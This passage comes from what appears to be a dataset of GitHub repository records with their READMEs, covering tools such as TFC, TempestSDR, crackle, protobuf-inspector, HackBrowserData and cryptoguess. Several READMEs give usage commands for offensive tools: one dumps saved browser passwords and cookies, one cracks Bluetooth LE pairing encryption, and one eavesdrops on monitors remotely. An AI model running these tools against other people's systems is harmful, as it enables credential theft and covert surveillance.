it can receive \\ndata from the insecure Networked Computer, but is unable to send data back to the Networked \\nComputer. The Receiver Program is designed to function under these constraints. However,\\neven though the program authenticates and validates all incoming data, it is not ruled out \\nmalware couldn't still infiltrate the Destination Computer. However, in the event that \\nwould happen, the malware would be unable to exfiltrate sensitive keys or plaintexts back \\nto the Networked Computer, as the data diode prevents all outbound traffic.\\n\\n2. The Source Computer uses the alternative data diode model. This means it can output\\nencrypted data to the insecure Networked Computer without having to worry about being\\ncompromised: The data diode protects the Source Computer from all attacks by physically\\npreventing all inbound traffic. The Transmitter Program is also designed to work under\\nthe data flow constraints introduced by the data diode; To allow key exchanges, the short \\nelliptic-curve public keys are input manually by the user. \\n\\n3. The Networked Computer is designed under the assumption it can be compromised by a\\nremote attacker: All sensitive data that passes through the Relay Program is encrypted and \\nsigned with no exceptions. Since the attacker is unable to exfiltrate decryption keys from \\nthe Source or Destination Computer, the ciphertexts are of no value to the attacker. \\n\\n\\n![](https://www.cs.helsinki.fi/u/oottela/wiki/readme/attacks.png)\\n[Exfiltration security](https://www.cs.helsinki.fi/u/oottela/wiki/readme/attacks.png)\\n\\n\\n### Qubes-isolated intermediate solution\\n\\nFor some users the\\n[APTs](https://en.wikipedia.org/wiki/Advanced_persistent_threat) \\nof the modern world are not part of the threat model, and for others, the \\nrequirement of having to build the data diode by themselves is a deal breaker. Yet, for \\nall of them, storing private keys on a networked device is still a security risk.\\n\\nTo meet these users' needs, TFC can also be run in three dedicated \\n[Qubes](https://www.qubes-os.org/)\\nvirtual machines. With the Qubes configuration, the isolation is provided by the \\n[Xen hypervisor](https://xenproject.org/users/security/), \\nand the unidirectionality of data flow between the VMs is enforced with strict firewall \\nrules. This intermediate isolation mechanism runs on a single computer which means no \\nhardware data diode is needed. \\n\\n\\n### Supported Operating Systems\\n\\n#### Source/Destination Computer\\n- Debian 10\\n- PureOS 9.0\\n- *buntu 20.04 LTS\\n- Linux Mint 20\\n- LMDE 4\\n- Qubes 4 (Debian 10 VM)\\n\\n#### Networked Computer\\n- Tails 4.8\\n- Debian 10\\n- PureOS 9.0\\n- *buntu 20.04 LTS\\n- Linux Mint 20\\n- LMDE 4\\n- Qubes 4 (Debian 10 VM)\\n\\n\\n### More information\\n[Threat model](https://github.com/maqp/tfc/wiki/Threat-model)<br>\\n[FAQ](https://github.com/maqp/tfc/wiki/FAQ)<br>\\n[Security design](https://github.com/maqp/tfc/wiki/Security-design)<br>\\n\\nHardware Data Diode<Br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Breadboard version](https://github.com/maqp/tfc/wiki/TTL-Data-Diode-(breadboard)) (Easy)<br> \\n&nbsp;&nbsp;&nbsp;&nbsp;[Perfboard version](https://github.com/maqp/tfc/wiki/TTL-Data-Diode-(perfboard)) (Intermediate)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[PCB version](https://github.com/maqp/tfc/wiki/TTL-Data-Diode-(PCB)) (Advanced)<br>\\n\\nHow to use<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Installation](https://github.com/maqp/tfc/wiki/Installation)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Master password setup](https://github.com/maqp/tfc/wiki/Master-Password)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Local key setup](https://github.com/maqp/tfc/wiki/Local-Key-Setup)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Onion Service setup](https://github.com/maqp/tfc/wiki/Onion-Service-Setup)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[X448 key exchange](https://github.com/maqp/tfc/wiki/X448)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Pre-shared keys](https://github.com/maqp/tfc/wiki/PSK)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Commands](https://github.com/maqp/tfc/wiki/Commands)<br>\\n\\n[Update log](https://github.com/maqp/tfc/wiki/Update-Log)<br>\\n\"", "topics": ["data-diode", "end-to-end-encryption", "endpoint-security", "hidden-services", "onion-service", "onion-services", "open-source", "privacy-by-design", "python3", "qubes-os", "secure-by-default", "secure-messenger", "tails", "tor", "tor-onion-service"], "writeup": "", "ignoredescription": false, "id": 27, "full_name": "maqp/tfc", "url": "https://github.com/maqp/tfc"},
{"tags": ["sdr", "tempest", "eavesdropping"], "owner": "martinmarinov", "description": "Remote video eavesdropping using a software-defined radio platform", "name": "TempestSDR", "topics_string": "sdr tempest eavesdropping", "language": "C", "readme": "\"TempestSDR\\n=============\\n\\nThis project is a software toolkit for remotely eavesdropping video monitors using a Software Defined Radio (SDR) receiver. It exploits compromising emanations from cables carrying video signals.\\n\\nRaster video is usually transmitted one line of pixels at a time, encoded as a varying current. This generates an electromagnetic wave that can be picked up by an SDR receiver. The software maps the received field strength of a pixel to a gray-scale shade in real-time. This forms a false colour estimate of the original video signal.\\n\\nThe toolkit uses unmodified off-the-shelf hardware which lowers the costs and increases mobility compared to existing solutions. It allows for additional post-processing which improves the signal-to-noise ratio. The attacker does not need to have prior knowledge about the target video display. All parameters such as resolution and refresh rate are estimated with the aid of the software. \\n\\nThe software consists of a library written in C, a collection of plug-ins for various Software Define Radio (SDR) front-ends and a Java based Graphical User Interface (GUI). It is a multi-platform application, with all native libraries pre-compiled and packed into a single Java jar file.\\n\\nRelease\\n------------\\n\\n * [JTempestSDR.jar](https://raw.github.com/martinmarinov/TempestSDR/master/Release/JavaGUI/JTempestSDR.jar) is the self contained multi platform GUI executable. It should work with just a double click on most Windows/Ubuntu x86/x64 based machines.\\n * [Download dlls] (https://github.com/martinmarinov/TempestSDR/tree/master/Release/dlls) contains the precompiled dll files for Linux/Windows x86/x64 which you can use in your own project under the GNU GPL license.\\n\\nDouble click on the JTempestSDR.jar file to launch. If it fails to launch, you will need to recompile the project.\\n\\n\\nBuilding the executable\\n------------\\n\\nThis is the Java wrapper and GUI. It builds all projects and supported plugins including the Java GUI itself. Go into the JavaGUI folder and type in\\n\\n make all\\n\\nIf it fails to find \\\"jni.h\\\", you should run one of the following commands:\\n\\n make all JAVA_HOME=path_to_jdk_installation\\n\\nOn Windows 8 x64 this could look like\\n\\n make all JAVA_HOME=C:/PROGRA~2/Java/jdk1.7.0_45\\n\\t\\nTo force compilation for X64 or X32 (in case your compiler supports it), do the following\\n\\n make all JAVA_HOME=C:/PROGRA~2/Java/jdk1.7.0_45 ARCHNAME=X64\\n\\nOn Ubuntu with openjdk it could look like\\n\\n make all JAVA_HOME=/usr/lib/jvm/java-6-openjdk-amd64\\n\\nOn Mac OSX commmand might look like\\n\\n make all JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_111.jdk/Contents/Home\\n\\nNote: This will also compile the plugins. Some of them require additional libraries! You can disable the plugin compilation by editing the Makefile in JavaSDR.\\n\\n### Windows\\n\\nYou need to have MinGW installed.\\n\\nOn Windows, this will also build the SDRplay RSP plugin. You first need to install the SDR driver from http://www.sdrplay.com/\\n\\nExample of how to compile for x64 Windows\\n\\n export PATH=$PATH:\\\"/cygdrive/C/Program Files/Java/jdk<put_your_version_here>/bin\\\"\\n make all JAVA_HOME=C:/PROGRA~1/Java/jdk<put_your_version_here> CC=x86_64-w64-mingw32-gcc ARCHNAME=X64\\n\\nAnd replace `<put_your_version_here>` with your JDK version.\\n\\nIf running SDRplay Plugin, make sure the mir_sdr_api.dll and sdrplay_api.dll are in the library path (or in the same directory as the executable).\\nYou can find the dll in C:/Program Files/SDRplay/API/x86 or C:/Program Files/SDRplay/API/x64 depending on your architecture. \\n\\nIf you don't intend to use the RSP dongle, you can skip this step by editing the Makefile in the JavaGUI directory. Remove TSDRPlugin\\\\_SDRPlay from line 89, changing it from\\n\\n PLUGINS += TSDRPlugin_SDRPlay TSDRPlugin_ExtIO\\n\\nto\\n\\n PLUGINS += TSDRPlugin_ExtIO\\n\\n### Linux and OS X\\n\\nOn Linux and OS X, compiling the GUI will also compile the UHD driver, so you will need to have UHD and the corresponding boost libraries installed (UHD will install them automatically). If you don't want the UHD drivers, then you can skip their compilation by removing the line 91 for Linux and line 93 for OS X from the Makefile in the JavaGUI directory.\\n\\n\\nBuilding the libraries\\n------------\\n\\nAll project could be built both with Eclipse and make as well.\\n\\n### TempestSDR library\\n\\nEnter the folder and type\\n\\n make all\\n\\t\\nThis will produce the library which could be found in the bin subdir. The headers you need to interface with it are located in src/include.\\n\\n### Plugins\\n\\nGo into a plugin directory and type\\n\\n make all\\n\\t\\nThis should work unless there is something specific for the plugin itself. Look for a README in this case.\\n\\nFolder Structure\\n------------\\n\\nThe different folders contain the different subprojects. The TempestSDR folder contains the main C library. The project aims to be crossplatform with plugin support for SDR frontends in different folders.\\n\\nRequirements for Building\\n------------\\n\\nThe project is built with Eclipse with the CDT plugin (but this is not required). Currently it supports Windows, Linux and OS X. Some frontend plugins might not be crossplatform. You also need a Java Development Kit (JDK) installed.\\n\\n### Windows\\n\\nYou need to have MinGW installed and gcc and make commands need to be in your path. Also javac and javah also need to be in your path.\\n\\n### Linux\\n\\nTo be announced soon.\\n\\n\\n\"", "topics": [], "writeup": "", "ignoredescription": false, "id": 28, "full_name": "martinmarinov/TempestSDR", "url": "https://github.com/martinmarinov/TempestSDR"},
{"tags": ["Bluetooth", "ble"], "owner": "mikeryan", "description": "Crack and decrypt BLE encryption", "name": "crackle", "topics_string": "bluetooth ble", "language": "C", "readme": "\"![crackle](https://raw.github.com/mikeryan/crackle/logo/crackle.png \\\"crackle\\\")\\n\\ncrackle cracks BLE Encryption (AKA Bluetooth Smart).\\n\\ncrackle exploits a flaw in the BLE pairing process that allows an\\nattacker to guess or very quickly brute force the TK (Temporary Key).\\nWith the TK and other data collected from the pairing process, the STK\\n(Short Term Key) and later the LTK (Long Term Key) can be collected.\\n\\nWith the STK and LTK, all communications between the master and the\\nslave can be decrypted.\\n\\nBefore attempting to use crackle, review the [FAQ](FAQ.md) to determine\\nwhether it is the appropriate tool to use in your situation.\\n\\ncrackle was written by Mike Ryan <mikeryan@lacklustre.net>\\nSee web site for more info:\\n http://lacklustre.net/projects/crackle/\\n\\n![Build Status](https://travis-ci.org/mikeryan/crackle.svg?branch=master \\\"Build Status\\\")\\n\\nTable of Contents\\n=================\\n\\n - Modes of Operation\\n - Crack TK\\n - Decrypt with LTK\\n - Running crackle\\n - Sample Files\\n - Frequently Asked Questions\\n - See Also\\n - Thanks\\n\\n\\nModes of Operation\\n==================\\n\\ncrackle has two major modes of operation: Crack TK and Decrypt with LTK.\\n\\nCrack TK\\n--------\\n\\nThis is the default mode used when providing crackle with an input file\\nusing ```-i```.\\n\\nIn Crack TK mode, crackle brute forces the TK used during a BLE pairing\\nevent. crackle exploits the fact that the TK in Just Works(tm) and\\n6-digit PIN is a value in the range [0,999999] padded to 128 bits.\\n\\ncrackle employs several methods to perform this brute force: a very fast\\nmethod if all pairing packets are present in the input file, and a slow\\nmethod if a minimum set of packets is present.\\n\\nTo use this mode, launch crackle with an input PCAP or PcapNG file\\ncontaining one or more connections with a BLE pairing conversation.\\ncrackle will analyze all connections, determine whether it is possible\\nto crack a given connection, and automatically choose the best strategy\\nto crack each one.\\n\\nIf the TK successfully cracks, crackle will derive the remaining keys\\nused to encrypt the rest of the connection and will decrypt any\\nencrypted packets that follow. If the LTK is exchanged (typically the\\nfirst thing done after encryption is established) crackle will output\\nthis value to stdout. The LTK can be used to decrypt any future\\ncommunications between the two endpoints.\\n\\nProvide crackle with an output file using ```-o``` to create a new PCAP\\nfile containing the decrypted data (in addition to the already\\nunencrypted data).\\n\\nExample usage:\\n\\n $ crackle -i input.pcap -o decrypted.pcap\\n\\n\\nDecrypt with LTK\\n----------------\\n\\nIn Decrypt with LTK mode, crackle uses a user-supplied LTK to decrypt\\ncommunications between a master and slave. This mode is identical to the\\ndecryption portion of Crack TK mode.\\n\\nExample usage:\\n\\n $ crackle -i encrypted.pcap -o decrypted.pcap -l 81b06facd90fe7a6e9bbd9cee59736a7\\n\\n\\nRunning Crackle\\n===============\\n\\nCrack TK Mode\\n-------------\\n\\nIn Crack TK mode, crackle requires a PCAP file that contains a BLE\\npairing event. The best way to generate such a file is to use an\\nUbertooth to capture a pairing event between a master and a slave.\\n\\nTo check if your PCAP file contains all the necessary packets, run\\ncrackle with the -i option:\\n\\n crackle -i <file.pcap>\\n\\ncrackle will analyze each connection in the input file and output the\\nresults of its analysis to stdout. If you have all the components of a\\npairing conversation, the output will look like this:\\n\\n Analyzing connection 0:\\n xx:xx:xx:xx:xx:xx (public) -> yy:yy:yy:yy:yy:yy (public)\\n Found 13 encrypted packets\\n\\n Cracking with strategy 0, 20 bits of entropy\\n\\n !!!\\n TK found: 412741\\n !!!\\n\\n Decrypted 12 packets\\n LTK found: 81b06facd90fe7a6e9bbd9cee59736a7\\n\\n Specify an output file with -o to decrypt packets!\\n\\nTo decrypt all packets, add the -o option:\\n\\n crackle -i <file.pcap> -o <output.pcap>\\n\\nThe output file will contain decrypted versions of all the encrypted\\npackets from the original PCAP, as well as all the unencrypted packets.\\nNote that CRCs are not recalculated, so the CRCs of decrypted packets\\nwill be incorrect.\\n\\nDecrypt with LTK\\n----------------\\n\\nIn Decrypt with LTK mode, crackle requires a PCAP file that contains at\\na minimum LL_ENC_REQ and LL_ENC_RSP packets and the LTK used to encrypt\\nthe communications.\\n\\nThe format for LTK is a 128 bit hexadecimal number with no spaces or\\nseparators, most-significant octet to least-significant octet. Example:\\n\\n -l 81b06facd90fe7a6e9bbd9cee59736a7\\n\\nTo check if your PCAP file contains all the necessary packets, run\\ncrackle with -i and -l:\\n\\n crackle -i <file.pcap> -l <ltk>\\n\\nIf you have both of the required packets, the program should produce\\noutput similar to this:\\n\\n Analyzing connection 0:\\n xx:xx:xx:xx:xx:xx (public) -> yy:yy:yy:yy:yy:yy (public)\\n Found 9 encrypted packets\\n Decrypted 6 packets\\n\\n Specify an output file with -o to decrypt packets!\\n\\nTo decrypt all packets, add the -o option:\\n\\n crackle -i <file.pcap> -o <out.pcap> -l <ltk>\\n\\nThe output file will be produced similarly to the output file described\\nabove.\\n\\n\\nSample Files\\n============\\n\\nThe test files included in the ```tests``` directory serve as\\ninteresting input for playing with crackle. Review the README files\\nincluded in each test's subdirectory.\\n\\nGrab some sample files for cracking with crackle. Refer to the README\\ninside the tarball for more information:\\n\\nhttps://lacklustre.net/bluetooth/crackle-sample.tgz\\n\\n\\nFrequently Asked Questions\\n==========================\\n\\nWe have compiled a list of [Frequently Asked Questions](FAQ.md).\\n\\n\\nSee Also\\n========\\n\\n - Ubertooth: http://ubertooth.sourceforge.net/\\n - libbtbb: http://libbtbb.sourceforge.net/\\n - #ubertooth on irc.freenode.net\\n\\n\\nThanks\\n======\\n\\nMajor thanks go to Mike Ossmann and Dominic Spill from the Ubertooth\\nproject. None of this would be possible without them.\\n\\nBig time thanks go to Mike Kershaw/dragorn of Kismet for help creating\\nand working with PCAP files.\\n\\nThanks go to the rest of #ubertooth on irc.freenode.net.\\n\"", "topics": [], "writeup": "crackle cracks BLE Encryption (AKA Bluetooth Smart). crackle exploits a flaw in the BLE pairing process that allows an attacker to guess or very quickly brute force the TK (Temporary Key). With the TK and other data collected from the pairing process, the STK (Short Term Key) and later the LTK (Long Term Key) can be collected. With the STK and LTK, all communications between the master and the slave can be decrypted.\n", "ignoredescription": false, "id": 29, "full_name": "mikeryan/crackle", "url": "https://github.com/mikeryan/crackle"},
{"tags": ["commandline", "protobuf"], "owner": "mildsunrise", "description": "\ud83d\udd75\ufe0f Tool to reverse-engineer Protocol Buffers with unknown definition", "name": "protobuf-inspector", "topics_string": "protocol-buffers reverse-engineering serialization commandline protobuf", "language": "Python", "readme": "\"# protobuf-inspector\\n\\nSimple program that can parse [Google Protobuf][] encoded blobs\\n(version 2 or 3) without knowing their accompanying definition.\\nIt will print a nice, colored representation of their contents. Example:\\n\\n![Main screenshot](https://i.imgur.com/Vw403MI.png)\\n\\nAs you can see, the field names are obviously lost, together with\\nsome high-level details such as:\\n\\n - whether a varint uses [zig-zag encoding][] or not (will assume no zig-zag by default)\\n - whether a 32-bit/64-bit value is an integer or float (both shown by default)\\n - signedness (auto-detect by default)\\n\\nBut protobuf-inspector is able to correctly guess the message structure\\nmost of the time. When it finds embedded binary data on a field, it'll\\nfirst try to parse it as a message. If that fails, it'll display the data\\nas a string or hexdump. It can make mistakes, especially with small chunks.\\n\\nIt shows the fields just in the order they are encoded in the\\nwire, so it can be useful for those wanting to get familiar with\\nthe [wire format][] or parser developers, in addition to reverse-engineering.\\n\\n## Usage\\n\\nNo dependencies required. Just run `main.py` and feed the protobuf blob\\non stdin:\\n\\n ./main.py < my-protobuf-blob\\n\\nAfter reading the first (blind) analysis of the blob, you typically start defining\\nsome of the fields so protobuf-inspector can better parse your blobs, until you get\\nto a point where you have a full protobuf definition and the parser no longer has\\nto guess anything.\\n\\n[Read about defining fields here.](CONFIG.md)\\n\\n## Parsing errors\\n\\nIf a parsing error is found, parsing will stop *within that field*, but\\nwill go on unaffected at the outside of the hierarchy. The stack trace will\\nbe printed where the field contents would go, along with a hexdump indicating where\\nparsing was stopped in that chunk, if applicable.\\n\\nSo, if you specified a `uint32` and a larger varint is found, you'd get something like:\\n\\n![Error on invalid varint](https://i.imgur.com/DWG9MGX.png)\\n\\nIf you specified that some field contained an embedded message, but invalid data was\\nfound there, you'd get:\\n\\n![Error on invalid message](https://i.imgur.com/URaWqXz.png)\\n\\nPlease note that `main.py` will exit with non-zero status if one or more parsing\\nerrors occurred.\\n\\n## Tricks\\n\\nThere are some tricks you can use to save time when approaching a blob:\\n\\n 1. If you are positive that a varint does *not* use zig-zag encoding, but are still\\n not sure of the signedness, leave it as `varint`. If it does use zig-zag encoding,\\n use `sint64` unless you are sure it's 32-bit and not 64-bit.\\n\\n 2. If a chunk is wrongly being recognized as a `packed chunk` or an embedded message,\\n or if you see something weird with the parsed message and want to see the raw bytes,\\n specify a type of `bytes`. Conversely, if for some reason it's not being detected\\n as an embedded message and it should, force it to `message` to see the reason.\\n\\n 3. If you want to extract a chunk's raw data to a file to analyze it better, specify a\\n type of `dump` and protobuf-inspector will create `dump.0`, `dump.1`,\\n etc. every time it finds a matching blob.\\n\\n 4. protobuf-inspector parses the blob as a message of type `root`, but that's just a\\n default. If you have lots of message types defined, you can pass a type name as\\n optional argument, and protobuf-inspector will use that instead of `root`:\\n \\n ./main.py request < my-protobuf-blob\\n\\n\\n\\n[Google Protobuf]: https://developers.google.com/protocol-buffers\\n[Wire format]: https://developers.google.com/protocol-buffers/docs/encoding\\n[Zig-zag encoding]: https://developers.google.com/protocol-buffers/docs/encoding#signed-integers\\n\"", "topics": ["protocol-buffers", "reverse-engineering", "serialization"], "writeup": "", "ignoredescription": false, "id": 30, "full_name": "mildsunrise/protobuf-inspector", "url": "https://github.com/mildsunrise/protobuf-inspector"},
{"tags": [], "owner": "moonD4rk", "description": "Decrypt passwords/cookies/history/bookmarks from the browser. \u4e00\u6b3e\u53ef\u5168\u5e73\u53f0\u8fd0\u884c\u7684\u6d4f\u89c8\u5668\u6570\u636e\u5bfc\u51fa\u89e3\u5bc6\u5de5\u5177\u3002", "name": "HackBrowserData", "topics_string": "browser browser-extension chrome edge firefox golang hacking macos pentest-tool windows", "language": "Go", "readme": "\"# HackBrowserData\\n\\n[\\u4e2d\\u6587\\u6587\\u6863](https://github.com/moonD4rk/HackBrowserData/blob/master/README_ZH.md) \\n\\nhack-browser-data is an open-source tool that could help you decrypt data[passwords|bookmarks|cookies|history] from the browser. It supports the most popular browsers on the market and runs on Windows, macOS and Linux.\\n\\n### Supported Browser\\n\\n#### Windows\\n| Browser | Password | Cookie | Bookmark | History |\\n| :---------------------------------- | :------: | :----: | :------: | :-----: |\\n| Google Chrome (Full Version) | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Firefox | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Microsoft Edge | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| 360 Speed Browser | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| QQ Browser | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Internet Explorer | \\u274c | \\u274c | \\u274c | \\u274c |\\n\\n#### MacOS\\n\\nBecause of the security policies, some of the browsers require a password.\\n\\n| Browser | Password | Cookie | Bookmark | History |\\n| :---------------------------------- | :------: | :----: | :------: | :-----: |\\n| Google Chrome<br />Require Password | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Firefox | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Microsoft Edge<br />Require Password | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Safari | \\u274c | \\u274c | \\u274c | \\u274c |\\n\\n#### Linux\\n\\n| Browser | Password | Cookie | Bookmark | History |\\n| :---------------------------------- | :------: | :----: | :------: | :-----: |\\n| Firefox | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n| Google Chrome | \\u2705 | \\u2705 | \\u2705 | \\u2705 |\\n\\n\\n### Install\\n\\nInstallation of hack-browser-data is dead-simple, just download [the release for your system](https://github.com/moonD4rk/HackBrowserData/releases) and run the binary.\\n\\n#### Building from source\\n\\nsupport `go 1.11+`\\n\\n```bash\\ngit clone https://github.com/moonD4rk/HackBrowserData\\n\\ncd HackBrowserData\\n\\ngo get -v -t -d ./...\\n\\ngo build\\n```\\n\\n#### Run\\n\\n```shell\\nPS C:\\\\test> .\\\\hack-browser-data.exe -h\\nNAME:\\n hack-browser-data - Export passwords/cookies/history/bookmarks from browser\\n\\nUSAGE:\\n [hack-browser-data -b chrome -f json -dir results -e all -cc]\\n Get all data(password/cookie/history/bookmark) from chrome\\n\\nGLOBAL OPTIONS:\\n --verbose, --vv Verbose (default: false)\\n --compress, --cc Compress result to zip (default: false)\\n --browser value, -b value Available browsers: all|chrome|edge|firefox (default: \\\"all\\\")\\n --results-dir value, --dir value Export dir (default: \\\"results\\\")\\n --format value, -f value Format, csv|json|console (default: \\\"json\\\")\\n --export-data value, -e value all|password|bookmark|cookie|history (default: \\\"all\\\")\\n --help, -h show help (default: false)\\n\\n\\nPS C:\\\\test> .\\\\hack-browser-data.exe -b all -f json -e all --dir results -cc\\n[x]: Get 44 cookies, filename is results/microsoft_edge_cookie.json\\n[x]: Get 54 history, filename is results/microsoft_edge_history.json\\n[x]: Get 1 passwords, filename is results/microsoft_edge_password.json\\n[x]: Get 4 bookmarks, filename is results/microsoft_edge_bookmark.json\\n[x]: Get 6 bookmarks, filename is results/360speed_bookmark.json\\n[x]: Get 19 cookies, filename is results/360speed_cookie.json\\n[x]: Get 18 history, filename is results/360speed_history.json\\n[x]: Get 1 passwords, filename is results/360speed_password.json\\n[x]: Get 12 history, filename is results/qq_history.json\\n[x]: Get 1 passwords, filename is results/qq_password.json\\n[x]: Get 12 bookmarks, filename is results/qq_bookmark.json\\n[x]: Get 14 cookies, filename is results/qq_cookie.json\\n[x]: Get 28 bookmarks, filename is results/firefox_bookmark.json\\n[x]: Get 10 cookies, filename is results/firefox_cookie.json\\n[x]: Get 33 history, filename is results/firefox_history.json\\n[x]: Get 1 passwords, filename is results/firefox_password.json\\n[x]: Get 1 passwords, filename is results/chrome_password.json\\n[x]: Get 4 bookmarks, filename is results/chrome_bookmark.json\\n[x]: Get 6 cookies, filename is results/chrome_cookie.json\\n[x]: Get 6 history, filename is results/chrome_history.json\\n[x]: Compress success, zip filename is results/archive.zip\\n```\\n\\n\\n### TODO\\n\\n[Desktop Browser Market Share Worldwide](https://gs.statcounter.com/browser-market-share/desktop/worldwide)\\n\\n| Chrome | Safari | Firefox | Edge Legacy | IE | Other |\\n| :------:| :------: | :----: | :------: | :-----: | :--: |\\n| 68.33% | 9.4% | 8.91% | 4.41% | 3% | 3% |\\n\\n[Desktop Browser Market Share China](https://gs.statcounter.com/browser-market-share/desktop/china)\\n\\n| Chrome | 360 Safe | Firefox | QQ Browser | IE | Sogou Explorer |\\n| :----- | :------: | :-----: | :--------: | :---: | :------------: |\\n| 39.85% | 22.26% | 9.28% | 6.5% | 5.65% | 4.74% |\\n\\n \\n\\n- [x] Chrome\\n- [x] QQ browser\\n- [x] Edge\\n- [x] 360 speed browser\\n- [x] Firefox\\n- [ ] Safari\\n- [ ] IE\"", "topics": ["browser", "browser-extension", "chrome", "edge", "firefox", "golang", "hacking", "macos", "pentest-tool", "windows"], "writeup": "hack-browser-data is an open-source tool that could help you decrypt data[passwords|bookmarks|cookies|history] from the browser. It supports the most popular browsers on the market and runs on Windows, macOS and Linux.", "ignoredescription": false, "id": 31, "full_name": "moonD4rk/HackBrowserData", "url": "https://github.com/moonD4rk/HackBrowserData"},
{"tags": [], "owner": "moul", "description": "Automatically detect and parse cryptography keys", "name": "cryptoguess", "topics_string": "cryptography decode decoder forensic guess hash tool", "language": "Go", "readme": "\"# cryptoguess\\n\\n:smile: cryptoguess automatically detects and parses cryptography keys from files\\n\\n[![CircleCI](https://circleci.com/gh/moul/cryptoguess.svg?style=shield)](https://circleci.com/gh/moul/cryptoguess)\\n[![GoDoc](https://godoc.org/moul.io/cryptoguess?status.svg)](https://godoc.org/moul.io/cryptoguess)\\n[![License](https://img.shields.io/github/license/moul/cryptoguess.svg)](https://github.com/moul/cryptoguess/blob/master/LICENSE)\\n[![GitHub release](https://img.shields.io/github/release/moul/cryptoguess.svg)](https://github.com/moul/cryptoguess/releases)\\n[![Go Report Card](https://goreportcard.com/badge/moul.io/cryptoguess)](https://goreportcard.com/report/moul.io/cryptoguess)\\n[![CodeFactor](https://www.codefactor.io/repository/github/moul/cryptoguess/badge)](https://www.codefactor.io/repository/github/moul/cryptoguess)\\n[![codecov](https://codecov.io/gh/moul/cryptoguess/branch/master/graph/badge.svg)](https://codecov.io/gh/moul/cryptoguess)\\n[![Docker Metrics](https://images.microbadger.com/badges/image/moul/cryptoguess.svg)](https://microbadger.com/images/moul/cryptoguess)\\n[![Made by Manfred Touron](https://img.shields.io/badge/made%20by-Manfred%20Touron-blue.svg?style=flat)](https://manfred.life/)\\n\\n\\n## Usage\\n\\n```console\\n$ find test/ -type f | xargs cryptoguess\\ntest/pem-rsa-pubkey.txt: potential candidates: PEM encoded data: x509: DER encoded public key, PEM encoded data\\ntest/jwt-token.txt: JWT signed token\\ntest/ssh-rsa-authorized-key.txt: SSH authorized key\\ntest/rsa-pubkey.txt: potential candidates: BASE64 encoded data: x509: DER encoded public key, BASE64 encoded data\\ntest/crypto-memory/D.der: x509: PKCS#1 public key (RSA) in ASN.1 DER form\\ntest/crypto-memory/E: PEM encoded data\\ntest/crypto-memory/A.pub: SSH authorized key\\ntest/crypto-memory/A: PEM encoded data\\ntest/crypto-memory/B.pem: potential candidates: PEM encoded data: x509: PKCS#1 public key (RSA) in ASN.1 DER form, PEM encoded data\\ntest/crypto-memory/B.pub: SSH authorized key\\ntest/crypto-memory/D.with-password: PEM encoded data\\ntest/crypto-memory/C.pub: SSH authorized key\\ntest/crypto-memory/D: potential candidates: PEM encoded data: x509: PKCS#1 private key (RSA) in ASN.1 DER form, PEM encoded data\\ntest/crypto-memory/D.pub: SSH authorized key\\ntest/crypto-memory/A.der: x509: PKCS#1 public key (RSA) in ASN.1 DER form\\ntest/crypto-memory/B: PEM encoded data\\ntest/crypto-memory/C: PEM encoded data\\ntest/crypto-memory/B.der: x509: PKCS#1 public key (RSA) in ASN.1 DER form\\ntest/crypto-memory/F.pem: potential candidates: PEM encoded data: x509: PKCS#1 public key (RSA) in ASN.1 DER form, PEM encoded data\\ntest/crypto-memory/D.pem: potential candidates: PEM encoded data: x509: PKCS#1 public key (RSA) in ASN.1 DER form, PEM encoded data\\ntest/crypto-memory/F.pub: SSH authorized key\\ntest/crypto-memory/A.pem: potential candidates: PEM encoded data: x509: PKCS#1 public key (RSA) in ASN.1 DER form, PEM encoded data\\ntest/crypto-memory/F.der: x509: PKCS#1 public key (RSA) in ASN.1 DER form\\n```\\n\\n```console\\n$ find test/ -type f | xargs file\\ntest/pem-rsa-pubkey.txt: ASCII text\\ntest/jwt-token.txt: ASCII text, with very long lines, with no line terminators\\ntest/ssh-rsa-authorized-key.txt: OpenSSH RSA public key\\ntest/rsa-pubkey.txt: ASCII text, with very long lines, with no line terminators\\ntest/crypto-memory/D.der: data\\ntest/crypto-memory/E: OpenSSH private key\\ntest/crypto-memory/A.pub: OpenSSH RSA public key\\ntest/crypto-memory/A: OpenSSH private key\\ntest/crypto-memory/B.pem: ASCII text\\ntest/crypto-memory/B.pub: OpenSSH RSA public key\\ntest/crypto-memory/D.with-password: PEM RSA private key\\ntest/crypto-memory/C.pub: OpenSSH ED25519 public key\\ntest/crypto-memory/D: PEM RSA private key\\ntest/crypto-memory/D.pub: OpenSSH RSA public key\\ntest/crypto-memory/A.der: data\\ntest/crypto-memory/B: OpenSSH private key\\ntest/crypto-memory/C: OpenSSH private key\\ntest/crypto-memory/B.der: data\\ntest/crypto-memory/F.pem: ASCII text\\ntest/crypto-memory/D.pem: ASCII text\\ntest/crypto-memory/F.pub: OpenSSH RSA public key\\ntest/crypto-memory/A.pem: ASCII text\\ntest/crypto-memory/F.der: data\\n```\\n\\n---\\n\\n```console\\n$ cryptoguess --debug test/ssh-rsa-authorized-key.txt\\ntest/ssh-rsa-authorized-key.txt: SSH authorized key\\n- PEM encoded data: err: no PEM data found\\n- SSH authorized key: *cryptoguess.ParsedSSHAuthorizedKey: &{0xc00005c8c0 lorem ipsum []}\\n- x509 DER encoded public key: err: asn1: structure error: tags don't match (16 vs {class:1 tag:19 length:115 isCompound:true}) {optional:false explicit:false application:false private:false defaultValue:<nil> tag:<nil> stringType:0 timeType:0 set:false omitEmpty:false} publicKeyInfo @2\\n```\\n\\n---\\n\\n```console\\n$ cryptoguess -h\\nNAME:\\n cryptoguess - A new cli 